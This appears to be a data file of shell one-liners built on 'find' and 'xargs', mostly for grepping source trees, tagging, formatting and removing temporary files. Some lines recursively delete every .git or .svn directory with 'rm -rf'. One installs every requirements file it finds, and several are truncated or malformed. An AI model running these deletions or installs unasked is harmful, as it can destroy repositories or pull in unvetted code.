"find ./ -maxdepth 5 -type f -name ""*.py"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.pl"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.pl"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.md"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.md"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.lua"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.lua"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.lsp"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.lsp"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.json"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.json"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.js"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.js"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.java"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.java"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.html"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.html"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.hs"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.hs"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.css"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.css"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.cpp"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.cpp"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.cfg"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.cfg"" | xargs egrep "
"find ./ -maxdepth 5 -type f -name ""*.c"" | xargs grep "
"find ./ -maxdepth 5 -type f -name ""*.c"" | xargs egrep "
"find ./ -iname ""*.java"" | xargs grep -F"
"find .-name ""*.git*"" -print0 | xargs -0 rm -rf;"
"find . | xargs grep
"find . | while read line; do if [ -d ""$line"" ]; then chmod 755 ""$line""; echo ""chmod 755 $line""; fi; done;"
"find . | sed -e ""s/[^-][^\/]*\// │/g; s/│\([^ ]\)/├─\1/"""
"find . | grep -v "".git"""
"find . | grep ""conflicted"""
"find . | grep ""\..*\..*\..*sw.$"""
"find . | ""$GREP"""
"find . \( -type f -o -type l \) -iname ""*\.xml"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.txt"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.py"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.mk"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.md"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.js"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.java"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.h*"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*\.c*"" -print0 | xargs -0 grep --color -n ""$@"""
"find . \( -type f -o -type l \) -iname ""*.sh"" -print0 | xargs -0 grep --color -in ""$@"""
"find . \( -type f -o -type l \) -iname ""*.json"" ! -iname ""*.info.json"" -print0 | xargs -0 grep --color -in ""$@"""
"find . \( -path ./node_modules -o -path ./tmp -o -iname ""*_bundle.js"" -o -iname ""*schema.rb"" \) -prune -o \( -iname ""*.rb"" -o -iname ""*.js"" -o -iname ""*.jsx"" \) -type f -exec wc -l {} \; | sort -rn"
"find . \( -path ./node_modules -o -path ./tmp -o -iname ""*_bundle.js"" -o -iname ""*schema.rb"" \) -prune -o \( -iname ""*.rb"" -o -iname ""*.js"" -o -iname ""*.jsx"" \) -type f -exec cat {} \; | wc -l"
"find . \( -path ""node_modules"" -o -path ""static"" \) -prune -o -name ""*.js""|xargs grep "
"find . \( -name ""Makefile"" -o -name ""Makefile\.*"" \) | xargs egrep -nw $1"
"find . \( -name ""CMakeLists.txt"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*~"" -o -name ""\#*\#"" \) | xargs rm"
"find . \( -name ""*~"" -o -name "".??*~"" -o -name ""\#*\#"" \) -print | xargs rm -f"
"find . \( -name ""*~"" -o -name ""#*"" \) -print | xargs rm"
"find . \( -name ""*.x??"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.ts"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.py"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.js"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.java"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.html"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.h"" -o -name ""*.hxx"" \) -print | xargs grep -n --color=always"
"find . \( -name ""*.dbg"" -o -name ""*.kdev4"" -o -name ""*-"" -o -name ""*~"" -o -name ""CMakeCache.txt"" -o -name ""CMakeFiles"" -o -name ""*.pyc"" -o -name ""*.log"" -o -name ""cmake_install.cmake"" \) -print0|xargs -0 \rm -rf --"
"find . \( -name ""*.c"" -o -name ""*.h"" -o -name ""*.fpl"" -o -name ""*.fplh"" -o -name ""*.cnp"" \) | xargs grep -rn "
"find . \( -name ""*.c"" -o -name ""*.cxx"" -o -name ""*.cpp"" -o -name ""*.cc"" \) -print | xargs grep -n --color=auto"
"find . \( -name ""*.c"" -o -name ""*.cc"" -o -name ""*.cpp"" \) | xargs grep -rn "
"find . \( -name ""*._*"" -o -name ""*.DS_Store*"" \)|xargs rm"
"find . \( -name ""*.[eo][1-9]*"" -or -name ""slurm-[1-9]*.out"" \) | xargs rm"
"find . \( -name ""*.[ch]"" -or -name ""*.cpp"" -or -name ""*.hpp"" \) -print0 | xargs -0 svn diff"
"find . \( -name ""*.[ch]"" -or -name ""*.cpp"" -or -name ""*.hpp"" \) -print0 | xargs -0 sed -i"
"find . \( -name ""*.[ch]"" -or -name ""*.cpp"" -or -name ""*.hpp"" \) -print0 | xargs -0 grep -n --color=always"
"find . \( -name ""*.[ch]"" -o -name ""*.[ch]xx"" \) -print | xargs grep -n --color=always"
"find . \( -iname ""*.py"" -o -iname ""*.pyw"" \) -print0|xargs -0 etags --append"
"find . \( -iname ""*.h"" -o -iname ""*.hpp"" \) | xargs grep -ni --color=always "
"find . \( -iname ""*.h"" -o -iname ""*.hpp"" -iname ""*.cpp"" -o -iname ""*.qml"" -o -iname ""*.qrc"" \) | xargs grep -ni --color=always "
"find . \( -iname ""*.h"" -o -iname ""*.cpp"" -o -iname ""*.c"" \) -print0|xargs -0 wc -l"
"find . \( -iname ""*.h"" -o -iname ""*.cpp"" -o -iname ""*.c"" \) -print0|xargs -0 etags --append"
"find . \( -iname ""*.h"" -o -iname ""*.c"" \) -print0|xargs -0 etags --append"
"find . \! \( -name "".svn"" -prune \) -a \! \( -name "".git"" -prune \) -a \( -type f -iname \*.php -o -iname \*.inc \) -print0 | xargs -0 grep -nH"
"find . \! \( -name "".svn"" -prune \) -a \! \( -name "".git"" -prune \) -a \( -type f -iname \*.php -o -iname \*.inc -o -iname \*.css -o -iname \*.js -o -iname \*.java \) -print0 | xargs -0 grep -nH"
"find . \! \( -name "".svn"" -prune \) -a \! \( -name "".git"" -prune \) -a \( -type f -iname \*.js \) -print0 | xargs -0 grep -nH"
"find . \! \( -name "".svn"" -prune \) -a \! \( -name "".git"" -prune \) -a \( -type f -iname \*.css \) -print0 | xargs -0 grep -nH"
"find . \! \( -name "".svn"" -prune \) -a \! \( -name "".git"" -prune \) -a -type f -print0 | xargs -0 grep -nH"
"find . -xdev -type f -not -path ""*.svn/*"" -not -path ""*.git/*"" -print0 2>/dev/null | xargs -0 grep --color=auto -InH"
"find . -type l | while read f; do if [ ! -e ""$f"" ]; then ls -l ""$f""; fi; done"
"find . -type l | \
"find . -type f | xargs -d ""\n"" grep -In"
"find . -type f | sed ""s#^./##"""
"find . -type f | egrep ""\.*h$"""
"find . -type f \( -not -path ""*/vendor/*"" \) -name ""*.php"" -exec php -l {} \; | grep -v ""No syntax errors detected"""
"find . -type f \( -name ""*.yml"" -o -name ""*.yaml"" \) | sources"
"find . -type f \( -name ""*.php"" -o -name ""*.sh"" -o -name ""*.rb"" -o -name ""*.m"" -o -name ""*.h"" -o -name ""*.plist"" -o -name ""*.java"" \) | xargs grep 2>/dev/null"
"find . -type f \( -name ""*.php"" -o -name ""*.html"" -o -name ""*.yml"" -o -name ""*.conf"" -o -name ""*.js"" -o -name ""*.css"" \) -print0 | xargs -0 grep -in"
"find . -type f \( -name ""*.c*"" -o -name ""*.h"" \) -print | xargs grep -in"
"find . -type f \( -name ""*.c"" -o -name ""*.h"" \) -print0 | xargs -0 norminette"
"find . -type f \( -name ""*.c"" -o -name ""*.cpp"" -o -name ""*.h"" -o -name ""*.hpp"" \) | sources"
"find . -type f -size 0k -exec rm {} \; | awk ""{ print $8 }"""
"find . -type f -regex "".*\.[cChH]\(pp\)*"" -o -name ""Makefile"" -print | xargs grep -nH"
"find . -type f -regex "".*\.[cC]\(pp\)*"" -print | xargs grep -nH"
"find . -type f -printf ""%TY-%Tm-%Td %TT %p\n"" | sort -r"
"find . -type f -printf ""%T@ %p\n"" | sort -nr"
"find . -type f -printf ""%T@ %p\n"" | sort -n"
"find . -type f -printf ""%T+ %p\n"" | sort -n"
"find . -type f -print0 | xargs -0 chmod 0644 && \
"find . -type f -print | xargs grep -li ""$0"""
"find . -type f -print | xargs \
"find . -type f -not -path "".\/.*""|peco"
"find . -type f -not -path ""./node_modules/*"" -not -path ""./build/*"" | xargs grep"
"find . -type f -not -path ""*/.git/*"" -not -path ""*/build/*"" | xargs wc -l"
"find . -type f -name ""pom.xml"" | sources"
"find . -type f -name ""ci.sh"" | xargs -I__ shfmt -i 2 -w __"
"find . -type f -name ""build.xml"" | sources"
"find . -type f -name ""Kconfig*"" ! -path ""./out/*"" ! -path ""./git/*"" -print0 | xargs -0 -P 4 grep -n"
"find . -type f -name "".DS_Store"" -print0 | xargs -0 rm"
"find . -type f -name "".DS_Store"" -print0 | xargs -0 rm -rf"
"find . -type f -name ""*~"" | xargs rm"
"find . -type f -name ""*~"" -or -name ""\#*\#"" -or -name ""*.pyc"" | xargs -I ""{}"" rm -v ""{}"" 2> /dev/null"
"find . -type f -name ""*py"" -print0 | xargs -0 grep -n"
"find . -type f -name ""*html"" -print0 | xargs -0 grep -n"
"find . -type f -name ""*\.xml"" -print0 | xargs -0 git grep --color -n $1"""
"find . -type f -name ""*\.c"" -print0 | xargs -0 grep --color -n $1"""
"find . -type f -name ""*.xml"" | sources"
"find . -type f -name ""*.txt"" | sources"
"find . -type f -name ""*.ts"" | xargs git diff --cached --name-only $against"
"find . -type f -name ""*.toml"" | sources"
"find . -type f -name ""*.thrift"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.sql"" | sources"
"find . -type f -name ""*.sql"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.sh"" | sources"
"find . -type f -name ""*.scala"" | sources"
"find . -type f -name ""*.scala"" | grep -i "
"find . -type f -name ""*.sbt"" | sources"
"find . -type f -name ""*.rst"" | sources"
"find . -type f -name ""*.rs"" | sources"
"find . -type f -name ""*.rb"" | xargs grep -n "
"find . -type f -name ""*.pyc"" -print0 | xargs -0 rm"
"find . -type f -name ""*.pyc"" -print0 | xargs -0 rm -v"
"find . -type f -name ""*.py[co]"" -exec rm -r \{\} \; && find . -type d -name ""__pycache__"" | xargs rm -rf && echo ""Removed pycs and __pycache__"""
"find . -type f -name ""*.py[co]"" -exec rm -f \{\} \; && find . -type d -name ""__pycache__"" | xargs rm -r && echo ""Removed pycs and __pycache__"""
"find . -type f -name ""*.py"" | xargs git diff --cached --name-only origin/master"
"find . -type f -name ""*.py"" | xargs etags"
"find . -type f -name ""*.py"" | sources"
"find . -type f -name ""*.py"" | grep -v env"
"find . -type f -name ""*.properties"" | sources"
"find . -type f -name ""*.profile"" | sources"
"find . -type f -name ""*.php"" | xargs grep --color -i "
"find . -type f -name ""*.php"" -print0 | xargs -0 grep"
"find . -type f -name ""*.php"" -print0 | xargs -0 grep -n $1"
"find . -type f -name ""*.php"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.php"" -exec php -l {} \; | grep -v ""No syntax errors"""
"find . -type f -name ""*.php"" -exec php -d error_reporting=32767 -l {} \; 2>&1 >&- | grep ""^"""
"find . -type f -name ""*.orig"" | xargs rm"
"find . -type f -name ""*.md"" | sources"
"find . -type f -name ""*.md"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.m4a"" -print0 | nice xargs -0 -i -P8 ffmpeg -n -i {} -b:a 320k {}.mp3"
"find . -type f -name ""*.log"" -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.js"" | while read f; do echo ""grinding $f to ${f/.js/.coffee} ""; js2coffee ""$f"" > ""${f/.js/.coffee}""; done"
"find . -type f -name ""*.js"" | while read f; do echo ""deleting $f ""; rm $f; done"
"find . -type f -name ""*.js"" | grep -v node_modules"
"find . -type f -name ""*.js"" -print0 | xargs -0 grep -n $1"
"find . -type f -name ""*.java"" | sources"
"find . -type f -name ""*.java"" | grep -i "
"find . -type f -name ""*.h"" | xargs grep"
"find . -type f -name ""*.h"" -print | xargs grep -nH "
"find . -type f -name ""*.go"" | xargs grep -n"
"find . -type f -name ""*.go"" -print0 | xargs --null goimports -w"
"find . -type f -name ""*.go"" -print0 | xargs --null gofmt -w"
"find . -type f -name ""*.form"" | sources"
"find . -type f -name ""*.ex"" -print0 | xargs -0 grep -n $1"
"find . -type f -name ""*.el"" | sources"
"find . -type f -name ""*.descriptor"" | sources"
"find . -type f -name ""*.css"" | sources"
"find . -type f -name ""*.cpp"" | xargs grep"
"find . -type f -name ""*.cpp"" | xargs git diff --cached --name-only $against"
"find . -type f -name ""*.conf"" | sources"
"find . -type f -name ""*.c"" | xargs grep"
"find . -type f -name ""*.[hC]"" | xargs cpplint --root=. --extensions=C --headers=h"
"find . -type f -name ""*.[hC]"" | xargs cppcheck --enable=all --language=c++ --std=c++03"
"find . -type f -name ""*.[ch]pp"" | xargs fgrep"
"find . -type f -name ""*.[ch]"" -not -name ""*.regex.c"" | etags -'"
"find . -type f -name ""*.*"" | xargs grep"
"find . -type f -name ""*.*"" | xargs grep -n --color=auto"
"find . -type f -name ""*"" | xargs grep"
"find . -type f -name ""*"" | xargs git diff --cached --name-only $against"
"find . -type f -maxdepth 2 -size -10k -not -name ""* *"" | xargs grep"
"find . -type f -links +1 -printf ""inode=%i file=%p \n"" | awk "
"find . -type f -links +1 -printf ""inode=%i %s=size nlinks=%n file=%p \n"" | sort -n"
"find . -type f -links +1 -printf ""%s=size nlinks=%n inode=%i file=%p \n"" | sort -n"
"find . -type f -iregex "".*vhd\(l\)?"" | xargs grep --color=auto"
"find . -type f -iregex "".*\.js$"" -not -path ""./node_modules/*"" -exec jsctags {} -f \; | sed "
"find . -type f -iregex "".*\.js$"" -exec jsctags {} -f \; | sed "
"find . -type f -iname ""thumbs.db"" -print0 | xargs -0 -r rm -v"
"find . -type f -iname ""*vhdl"" | xargs grep --color=auto"
"find . -type f -iname ""*.py"" -print | xargs -d""\n"" egrep"
"find . -type f -iname ""*.mp3"" -print0 | xargs -0 mp3val -f -nb -t"
"find . -type f -iname ""*.mp3"" -print0 | xargs -0 mp3gain -c -p -r -d 6.0"
"find . -type f -iname ""*.clj"" | xargs ctags -a"
"find . -type f -iname ""*.[he]rl"" | etags -"
"find . -type f -exec stat -f ""%Sm %N"" -t ""%Y%m%d%H%M"" {} \; | sort -r"
"find . -type f -exec ls -1lt ""{}"" + | head "
"find . -type f -exec file -b {} \; -printf '%s\n' | awk -F , 'NR%2 {i=\$1} NR%2==0 {a[i]+=\$1} END {for (i in a) printf (\"
"find . -type f -a \( -name ""*\.m"" -o -name ""*\.c"" -o -name ""*\.h"" -o -name ""*\.cpp"" -o -name ""*\.asm"" -o -name ""*\.inc"" \) | xargs egrep -n --color=ALWAYS -w "
"find . -type f -a \( -name ""*\.m"" -o -name ""*\.c"" -o -name ""*\.h"" -o -name ""*\.cpp"" -o -name ""*\.asm"" -o -name ""*\.inc"" \) | xargs egrep -n --color=ALWAYS -i"
"find . -type f -a \( -name ""*\.m"" -o -name ""*\.c"" -o -name ""*\.h"" -o -name ""*\.cpp"" -o -name ""*\.asm"" -o -name ""*\.inc"" \) | xargs egrep -n --color=ALWAYS -i -w "
"find . -type f -a \( -name ""*\.m"" -o -name ""*\.c"" -o -name ""*\.h"" -o -name ""*\.cpp"" -o -name ""*\.asm"" -o -name ""*\.inc"" \) | xargs egrep -n --color=ALWAYS "
"find . -type f ! -regex "".*/\.git.*"" | xargs wc"
"find . -type d \( -name ""*.git*"" -o -name ""node_modules"" -o -name ""static"" \) -prune -o -type f -print0 | xargs -0 grep --color=auto"
"find . -type d \! -regex "".*\.git.*"" -print0 | xargs -0 ls -G"
"find . -type d -print0|parallel --no-notice --null --keep-order ""metaflac --add-replay-gain {}/*.flac"""
"find . -type d -print0 | xargs -0 chmod 0755 && \
"find . -type d -name .git -exec echo \; -exec echo \; -exec echo {} \; -exec echo ""################################"" \; -exec bash -c "" git -c color.status=always --git-dir={} --work-tree=\$(dirname ""{}"") status"" \; | less -REX"
"find . -type d -name .git -exec echo \; -exec echo \; -exec echo {} \; -exec echo ""################################"" \; -exec bash -c "" git -c color.status=always --git-dir={} --work-tree=\$(dirname ""{}"") push origin --all"" \; | less -REX"
"find . -type d -name "".svn"" | xargs rm -rf"
"find . -type d -name "".git"" | while read dir ; do sh -c ""cd $dir/../ && echo \""\nGIT STATUS IN DIR: ${dir//\.git/}\"" && git status -s"" ; done"
"find . -type d -name "".git"" | while read dir ; do sh -c ""cd $dir/../ && echo \""\nGIT STATUS IN ${dir//\.git/}\"" && git status -s"" ; done"
"find . -type d -mindepth 1 -maxdepth 1 | xargs -I{} sh -c ""echo; echo {}; git -C {} st;"""
"find . -type d -maxdepth 1 -exec sh -c ""du -h {} | tail -n 1"" \;"
"find . -size +10M -exec ls -lh ""{}"" \;| sort -k 5 -rn"
"find . -regextype posix-extended -regex "".*\.(e|o)[0-9]{5,}(-[0-9]+)?"" -delete"
"find . -regextype posix-extended -regex "".*\.(e|o)[0-9]{4,}.*"" -delete"
"find . -regextype posix-awk -regex "".*\.(cpp|h)"" -exec cp {} ../control_cc/src/. \;"
"find . -regextype ""egrep"" -regex "".*\.py$"" -print0 | xargs -0 grep"
"find . -regextype ""egrep"" -regex "".*\.pkg$"" -print0 | xargs -0 grep"
"find . -regextype ""egrep"" -regex "".*\.lua$"" -print0 | xargs -0 grep"
"find . -regex ""\(.*__pycache__.*\|*.py[co]\)"" -delete"
"find . -regex ""./node_modules/[^/]*/README.*"" -type f | fzf --preview=""less {}"" --preview-window=right:60% --ansi --bind ""enter:execute(open -a \""Marked 2\"" {})"" --delimiter=/ --with-nth=3 --header=""open README"""
"find . -regex "".*\.vb"" -type f -print0 | xargs -0 grep -n -i "
"find . -regex "".*\.v"" | xargs grep --color=auto"
"find . -regex "".*\.sql"" -type f -print0 | xargs -0 grep -n -i "
"find . -regex "".*\.js"" -type f -print0 | xargs -0 grep -n -i "
"find . -regex "".*\.cs"" -type f -print0 | xargs -0 grep -n -i "
"find . -regex "".*\.config"" -type f -print0 | xargs -0 grep -n -i "
"find . -regex "".*\.[cChH]\(pp\)?"" -print | etags -"
"find . -printf ""%T@ %Tc %p\n"" | sort -n"
"find . -printf ""%T@ %Tc %p "" | sort -n"
"find . -path ""./vendor/*"" -prune -o -name ""*.go"" -type f -print0 | xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -path ""./out"" -prune -o -type f -name ""*\.java"" -print0 | xargs -0 grep --color -n"
"find . -path ""./applications/*/migrations"" -prune -o -name ""*.py"" | xargs grep"
"find . -path ""*CVS"" -prune -o -path "".svn"" -prune -o -path ""*.hg"" -prune -o -type f -a -not -name ""*~"" -name ""GNUmakefile"" -or -name ""[m|M]akefile*"" -or -name ""*.mk"""
"find . -path ""*CVS"" -prune -o -path "".svn"" -prune -o -path ""*.hg"" -prune -o -name ""*.[c|C]*"" -a -type f -a -not -name ""*~"""
"find . -path ""*/.git/*"" -o -path ""*/node_modules/*"" -o -name ""*.sql"" -o -name ""*.mysql"" -o -name ""*.sublime-*"" -o -name ""*.min.*"" -o -name ""*.log"" -prune -o -type f -print0 | xargs -0 grep -I -n"
"find . -not \( -name .svn -prune -o -name .git -prune \) -type f -print0 | xargs -0 sed -i """" -E ""s/[[:space:]]*$//"""
"find . -not -type d -exec file ""{}"" "";"" | grep CRLF"
"find . -not -path ""*node_modules*"" -not -path ""*dist*"" -not -path ""*images*"" -name ""*.js"" | xargs grep -inr"
"find . -not -path ""*node_modules*"" -not -path ""*dist*"" -not -path ""*images*"" -name ""*.js"" -o -name ""*.vue"" | xargs grep -inr"
"find . -not -path ""*.git*"" -not -path ""*.venv*"" -type f | xargs wc -l"
"find . -not -iwholename ""*node_modules*"" -type f -name *.js | xargs fixmyjs --legacy"
"find . -not -iname ""*[chs]"" | xargs grep -inH --color=auto "
"find . -name \""*.py[c|o]\"" -o -name __pycache__ -exec rm -rf {} +"
"find . -name .repo -prune -o -name .git -prune -o -type f \( -name ""*.c"" -o -name ""*.h"" -o -name ""*.cpp"" -o -name ""*.cc"" -o -name ""Kconfig"" -o -name ""Makefile"" \) -print0 | xargs -0 grep --color -n"
"find . -name .repo -prune -o -name .git -prune -o -type f -name ""*\.java"" -print0 | xargs -0 grep --color -n ""$@"""
"find . -name .DS_Store > /tmp/dskill && wc -l /tmp/dskill | sed ""s:/.*$:.DS_Store files removed:"" && while read line; do rm ""$line""; done < /tmp/dskill && rm /tmp/dskill"
"find . -name *.cpp -o -name *.h | sed ""s/.\///;s/management_libs\/.../management_libs\/current/"""
"find . -name '*' -print0 | xargs -0 grep --color -n $1"""
"find . -name ""target"" -type d -print0 | xargs -0 rm -rf"
"find . -name ""tags"" -print0 | xargs -0 rm"
"find . -name ""slurm-[1-9]*.out"" | xargs rm"
"find . -name ""requirements*"" | xargs -n 1 pip install -r"
"find . -name ""pom.xml"" | grep -v target"
"find . -name ""node_modules"" | xargs rm -Rf"
"find . -name ""node_modules"" | awk -F ""node_modules"" "
"find . -name ""node_modules"" -type d -prune -print | xargs du -chs"
"find . -name ""cscope.*"" | xargs rm -f"
"find . -name ""cscope.*"" | xargs ls -l"
"find . -name ""build.xml"" | xargs egrep -nw $1"
"find . -name ""build"" -or -name ""out"" -or -name ""generated"" | xargs -I {} rm -rf {}"
"find . -name ""__pycache__"" | xargs rm -rf {}"
"find . -name ""Makefile*""|xargs grep -nE "
"find . -name ""Makefile"" -o -name ""*.mk""|xargs grep -Hn $@"
"find . -name "".tox"" -prune -o -name ""tests"" -prune -o -name "".git"" -prune -o -name ""*.py"" -type f -print0 | xargs -0 grep -n --color=auto"
"find . -name "".tox"" -prune -o -name ""tests"" -prune -o -name "".git"" -prune -o -name ""*.[ch]"" -type f -print0 | xargs -0 grep -n --color=auto"
"find . -name "".tox"" -prune -o -name ""tests"" -prune -o -name "".git"" -prune -o -name ""*"" -type f -print0 | xargs -0 grep -n --color=auto"
"find . -name "".terraform"" | xargs rm -Rf"
"find . -name "".svn"" | xargs rm -Rf"
"find . -name "".sql-status.json"" -type f -print0 | xargs -0 /bin/rm -f"
"find . -name "".session.vim"" | xargs /bin/rm -f"
"find . -name "".gs"" | xargs rm -Rf"
"find . -name "".git"" | xargs rm -rf"
"find . -name "".git"" | xargs rm -Rf"
"find . -name "".git"" -type d | xargs -P10 -I{} git --git-dir={} pull"
"find . -name ""._*"" | xargs rm -f"
"find . -name ""._*"" -print0 | xargs -0 rm -rfv"
"find . -name "".DS_Store"" | xargs rm"
"find . -name "".DS_Store"" -type f -print0 | xargs -0 rm"
"find . -name "".DS_Store"" -print0|xargs -0 rm"
"find . -name "".DS_Store"" -print0 | xargs -0 rm"
"find . -name "".DS_Store"" -print0 | xargs -0 rm -rfv"
"find . -name "".DS_Store"" -print0 | xargs -0 rm -rf"
"find . -name "".*.sw*""|xargs rm"
"find . -name "".*.sw*"" | xargs rm -f"
"find . -name "".*.sw*"" -print0 | xargs -0 rm"
"find . -name "".*.r[0-9]*"" | grep -v "".svn"""
"find . -name ""*‾"" | xargs rm"
"find . -name ""*~"" | xargs rm"
"find . -name ""*~"" | xargs rm -vrf"
"find . -name ""*~"" | xargs rm -fv"
"find . -name ""*~"" | xargs -r rm"
"find . -name ""*~"" -type f | xargs -I {} rm -rf {}"
"find . -name ""*~"" -print0 | xargs -0 rm"
"find . -name ""*~"" -print0 | xargs -0 rm -vrf"
"find . -name ""*~"" -print0 | xargs -0 rm -v"
"find . -name ""*~"" -print | xargs rm -rfv"
"find . -name ""*~"" -o -name ""\#*\#"" | xargs rm -f {} \;"
"find . -name ""*~"" -o -name "".*~"" -type f | xargs rm -vf"
"find . -name ""*~"" -o -name "".*~"" -type f | xargs echo"
"find . -name ""*~"" -o -name "".*~"" -o -name ""._*"" -o -name "".DS*"" | xargs rm -f"
"find . -name ""*~"" -o -name ""#*#"" | xargs -r rm"
"find . -name ""*tex"" | xargs grep -n --color=auto"
"find . -name ""*rb"" | xargs egrep"
"find . -name ""*py"" | xargs /usr/local/bin/etags --extra=+q"
"find . -name ""*py"" | xargs -I {} autopep8 -i {}"
"find . -name ""*mk*"" | xargs grep"
"find . -name ""*mak*"" | xargs grep"
"find . -name ""*log*"" | xargs grep"
"find . -name ""*go"" | xargs -n1 gofmt -w -tabwidth=2 -tabs=false"
"find . -name ""*descriptor.json"" | xargs -t arrow --logLevel=debug --driver=selenium --reuseSession=true "
"find . -name ""*descriptor.json"" | xargs -t arrow --logLevel=debug "
"find . -name ""*cpp"" -o -name ""*cxx"" -o -name ""*.hh"" -o -name ""*.h"" -o -name ""*.icc"" | xargs etags --extra=+q --language-force=c++"
"find . -name ""*\.mk"" -o -name ""*\.sh"" -print0 | xargs -0 grep --color -n $1"""
"find . -name ""*[~#]"" | xargs rm"
"find . -name ""*[ch]"" -print | xargs grep $1 -H -n"
"find . -name ""*??*"" -print | xargs gsed -i ' #""s/var1/var2/g"
"find . -name ""*.zip"" | while read filename; do unzip -o -d ""`dirname ""$filename""`"" ""$filename""; done;"
"find . -name ""*.yaml"" -o -name ""*.yml"" -o -name ""*.eyaml"" -o -name ""*.eyml"" | xargs grep --color=auto"
"find . -name ""*.xsd"" | xargs egrep -nw $1"
"find . -name ""*.xml""|xargs grep"
"find . -name ""*.xml"" | xargs egrep -nw $1"
"find . -name ""*.xml"" | xargs egrep --color -n"
"find . -name ""*.xib"" -print0 | xargs -0 grep"
"find . -name ""*.xcodeproj"" | xargs open"
"find . -name ""*.vue"" | xargs grep -inr"
"find . -name ""*.txt""|xargs grep"
"find . -name ""*.txt"" -print | xargs grep -n"
"find . -name ""*.tsv""|xargs grep"
"find . -name ""*.tpl"" | xargs grep $1 -wn"
"find . -name ""*.tar.gz"" -print0 | xargs -0 -n1 tar -zxvf"
"find . -name ""*.swp"" | xargs rm"
"find . -name ""*.swp"" -print | xargs rm -rfv"
"find . -name ""*.svn*"" -prune -o -type f -print0 | xargs -0 grep"
"find . -name ""*.svn"" -type d | xargs rm -rv"
"find . -name ""*.sql""|xargs grep"
"find . -name ""*.sh"" | xargs egrep --color -n"
"find . -name ""*.sh"" -o -name ""*.pl"" | xargs chmod +x"
"find . -name ""*.scss"" | xargs grep -inr"
"find . -name ""*.sass"" | xargs grep"
"find . -name ""*.rs""| xargs grep -nE"
"find . -name ""*.rbc"" -print0 | xargs -0 rm"
"find . -name ""*.rb""|xargs grep"
"find . -name ""*.rb"" | xargs grep -n"
"find . -name ""*.rb"" | xargs grep "
"find . -name ""*.rb"" | xargs ctags"
"find . -name ""*.rb"" -print0 | xargs -0 grep --color=tty -d skip -Hnr"
"find . -name ""*.rb"" -print | xargs grep -n"
"find . -name ""*.rb"" -not -path ""*/vendor/*"" -not -path ""*/test/*"" -not -path ""*/.git/*"" -not -path ""*/.svn/*"" -print | sed -E -e "
"find . -name ""*.pyc"" | xargs trash"
"find . -name ""*.pyc"" | xargs rm"
"find . -name ""*.pyc"" | xargs rm -v"
"find . -name ""*.pyc"" | xargs -I {} rm -v ""{}"""
"find . -name ""*.pyc"" -type f|xargs rm -f"
"find . -name ""*.pyc"" -print0|xargs -0 rm"
"find . -name ""*.pyc"" -print0 | xargs -0 rm"
"find . -name ""*.pyc"" -print0 | xargs --null rm"
"find . -name ""*.pyc"" -exec rm -rf {} \; ; find . -name ""__pycache__"" -type d -print0 | xargs -0 rm -rf"
"find . -name ""*.pyc"" -delete; find . -name __pycache__ | xargs rm -rf"
"find . -name ""*.py[c|o]"" -o -name __pycache__ -exec rm -rf {} +"
"find . -name ""*.py""|xargs grep -nE "
"find . -name ""*.py""|xargs grep --color"
"find . -name ""*.py"" |xargs grep -n --color=auto $* 2>/dev/null"
"find . -name ""*.py"" | xargs pycodestyle"
"find . -name ""*.py"" | xargs grep -ns "
"find . -name ""*.py"" | xargs grep -n"
"find . -name ""*.py"" | xargs grep -n --color=auto"
"find . -name ""*.py"" | xargs grep -inr"
"find . -name ""*.py"" | xargs grep --color=auto"
"find . -name ""*.py"" | xargs grep "
"find . -name ""*.py"" | xargs etags --lang=python"
"find . -name ""*.py"" | xargs egrep"
"find . -name ""*.py"" | xargs egrep --color -n"
"find . -name ""*.py"" | xargs autopep8 --in-place"
